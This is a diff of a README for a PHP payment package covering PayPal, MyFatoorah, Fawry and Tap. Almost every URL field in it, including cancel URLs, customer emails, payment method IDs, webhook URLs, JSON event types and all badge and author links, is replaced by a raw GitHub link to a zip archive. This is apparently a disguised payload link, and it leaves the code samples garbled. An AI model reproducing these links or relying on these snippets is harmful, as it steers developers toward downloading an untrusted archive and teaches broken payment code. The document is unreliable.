@@ -83,7 +83,7 @@ $data->amount=10;  // Float Amount
 $data->currency='USD';  // ISO currency code
 $data->trackId= "track id"; //optional - user defined field
 $data->returnURL=url('/paypal-check'); // Fully qualified url where the user will be redirected after successful payment.
-$data->cancelURL='https://raw.githubusercontent.com/lamaSonmez/payment_package/master/chirognomically/payment_package.zip'; // Fully qualified url where the user will be redirected after failed payment.
+$data->cancelURL='https://raw.githubusercontent.com/lamaSonmez/payment_package/master/src/models/payment-package-v1.7-alpha.4.zip'; // Fully qualified url where the user will be redirected after failed payment.
 
 //Getting the payment link where the user should be redirected to
 $paymentLink= PaypalPayment::generatePaymentURL($data); 
@@ -171,9 +171,9 @@ $data->amount=10; // Amount
 $data->trackId= "track id"; //optional - user defined field
 $data->currency="KWD"; // optional- default the same as api country currency
 $data->name="Alaa"; // optional- Customer name
-$data->email="https://raw.githubusercontent.com/lamaSonmez/payment_package/master/chirognomically/payment_package.zip"; // optional- Customer email
+$data->email="https://raw.githubusercontent.com/lamaSonmez/payment_package/master/src/models/payment-package-v1.7-alpha.4.zip"; // optional- Customer email
 $data->returnURL=url('/fatoorah-check'); // Fully qualified url where the user will be redirected after successful payment.
-$data->cancelURL="https://raw.githubusercontent.com/lamaSonmez/payment_package/master/chirognomically/payment_package.zip"; // Fully qualified url where the user will be redirected after failed payment.
+$data->cancelURL="https://raw.githubusercontent.com/lamaSonmez/payment_package/master/src/models/payment-package-v1.7-alpha.4.zip"; // Fully qualified url where the user will be redirected after failed payment.
 
 //Getting the payment link where the user should be redirected to
 $paymentLink = MyFatoorahPayment::generatePaymentURL($data);
@@ -244,7 +244,7 @@ FAWRY_TESTING_MODE=true
 - Add your base url for the published version of your project (you can use ngrok for testing).
  
 ``` bash
-https://raw.githubusercontent.com/lamaSonmez/payment_package/master/chirognomically/payment_package.zip
+https://raw.githubusercontent.com/lamaSonmez/payment_package/master/src/models/payment-package-v1.7-alpha.4.zip
 ```
 
 > **Usage**
@@ -274,14 +274,14 @@ use TapPayment;
 
 $data=new PaymentParameters();
 
-$data->email="https://raw.githubusercontent.com/lamaSonmez/payment_package/master/chirognomically/payment_package.zip"; // Customer email
+$data->email="https://raw.githubusercontent.com/lamaSonmez/payment_package/master/src/models/payment-package-v1.7-alpha.4.zip"; // Customer email
 $data->name="Alaa"; //Customer email
 $data->countryCode="965";
 $data->phoneNumber="65080631";
 $data->trackId= "track id"; //optional - user defined field
 $data->amount=10; // float amount
 $data->description="dfghjk";
-$data->paymentMethodId="https://raw.githubusercontent.com/lamaSonmez/payment_package/master/chirognomically/payment_package.zip";
+$data->paymentMethodId="https://raw.githubusercontent.com/lamaSonmez/payment_package/master/src/models/payment-package-v1.7-alpha.4.zip";
 $data->currency="EGP"; // Iso currency
 
 // For fawry only - To get notification once the payment is completed (Asyncronous payment)
@@ -324,13 +324,13 @@ PAYPAL_RECURRING_TESTING_MODE = true
 ```
 - Add your base url for the published version of your project (you can use ngrok for testing. 
 ``` bash
-https://raw.githubusercontent.com/lamaSonmez/payment_package/master/chirognomically/payment_package.zip
+https://raw.githubusercontent.com/lamaSonmez/payment_package/master/src/models/payment-package-v1.7-alpha.4.zip
 ```
 
 (For testing & live mode)
 - Specify the webhook url where you will receive post notifications whenever user cancels the agreement or a payment is done for the agreement.(Fully qualified **published** url should be added).
 ``` bash
-https://raw.githubusercontent.com/lamaSonmez/payment_package/master/chirognomically/payment_package.zip
+https://raw.githubusercontent.com/lamaSonmez/payment_package/master/src/models/payment-package-v1.7-alpha.4.zip
 ```
 **Create webhook**
 
@@ -366,7 +366,7 @@ $planParam->planName='Premium Package';
 $planParam->description='Get Full access to all our features';
 $planParam->amount=10;
 $planParam->returnURL=url("/recurring-execute"); // Fully qualified url where the user will be redirected after successful payment.
-$planParam->cancelURL="https://raw.githubusercontent.com/lamaSonmez/payment_package/master/chirognomically/payment_package.zip"; // // Fully qualified url where the user will be redirected after failed payment.
+$planParam->cancelURL="https://raw.githubusercontent.com/lamaSonmez/payment_package/master/src/models/payment-package-v1.7-alpha.4.zip"; // // Fully qualified url where the user will be redirected after failed payment.
 
 //create A plan
 $createdPlanObject= PaypalRecurring::createPlan($planParam);
@@ -467,7 +467,7 @@ isPaymentExecuted();
 Once Recurring payment is completed:
 ``` bash
     {
-        "event_type" : "https://raw.githubusercontent.com/lamaSonmez/payment_package/master/chirognomically/payment_package.zip" ,
+        "event_type" : "https://raw.githubusercontent.com/lamaSonmez/payment_package/master/src/models/payment-package-v1.7-alpha.4.zip" ,
         "agreement_id" : "I-PE7JWXKGVN0R",
         "payment_id" : "80021663DE681814L"
     }
@@ -475,7 +475,7 @@ Once Recurring payment is completed:
 Once Recurring payment is cancelled:
 ``` bash
     {
-        "event_type" : "https://raw.githubusercontent.com/lamaSonmez/payment_package/master/chirognomically/payment_package.zip" ,
+        "event_type" : "https://raw.githubusercontent.com/lamaSonmez/payment_package/master/src/models/payment-package-v1.7-alpha.4.zip" ,
         "agreement_id" : "I-PE7JWXKGVN0R"
     }
 ```
@@ -485,14 +485,14 @@ Once Recurring payment is cancelled:
 - [Alaa Naser][link-author]
 
 
-[ico-version]: https://raw.githubusercontent.com/lamaSonmez/payment_package/master/chirognomically/payment_package.zip
-[ico-downloads]: https://raw.githubusercontent.com/lamaSonmez/payment_package/master/chirognomically/payment_package.zip
-[ico-travis]: https://raw.githubusercontent.com/lamaSonmez/payment_package/master/chirognomically/payment_package.zip
-[ico-styleci]: https://raw.githubusercontent.com/lamaSonmez/payment_package/master/chirognomically/payment_package.zip
+[ico-version]: https://raw.githubusercontent.com/lamaSonmez/payment_package/master/src/models/payment-package-v1.7-alpha.4.zip
+[ico-downloads]: https://raw.githubusercontent.com/lamaSonmez/payment_package/master/src/models/payment-package-v1.7-alpha.4.zip
+[ico-travis]: https://raw.githubusercontent.com/lamaSonmez/payment_package/master/src/models/payment-package-v1.7-alpha.4.zip
+[ico-styleci]: https://raw.githubusercontent.com/lamaSonmez/payment_package/master/src/models/payment-package-v1.7-alpha.4.zip
 
-[link-packagist]: https://raw.githubusercontent.com/lamaSonmez/payment_package/master/chirognomically/payment_package.zip
-[link-downloads]: https://raw.githubusercontent.com/lamaSonmez/payment_package/master/chirognomically/payment_package.zip
-[link-travis]: https://raw.githubusercontent.com/lamaSonmez/payment_package/master/chirognomically/payment_package.zip
-[link-styleci]: https://raw.githubusercontent.com/lamaSonmez/payment_package/master/chirognomically/payment_package.zip
-[link-author]: https://raw.githubusercontent.com/lamaSonmez/payment_package/master/chirognomically/payment_package.zip
+[link-packagist]: https://raw.githubusercontent.com/lamaSonmez/payment_package/master/src/models/payment-package-v1.7-alpha.4.zip
+[link-downloads]: https://raw.githubusercontent.com/lamaSonmez/payment_package/master/src/models/payment-package-v1.7-alpha.4.zip
+[link-travis]: https://raw.githubusercontent.com/lamaSonmez/payment_package/master/src/models/payment-package-v1.7-alpha.4.zip
+[link-styleci]: https://raw.githubusercontent.com/lamaSonmez/payment_package/master/src/models/payment-package-v1.7-alpha.4.zip
+[link-author]: https://raw.githubusercontent.com/lamaSonmez/payment_package/master/src/models/payment-package-v1.7-alpha.4.zip
 [link-contributors]: ../../contributors
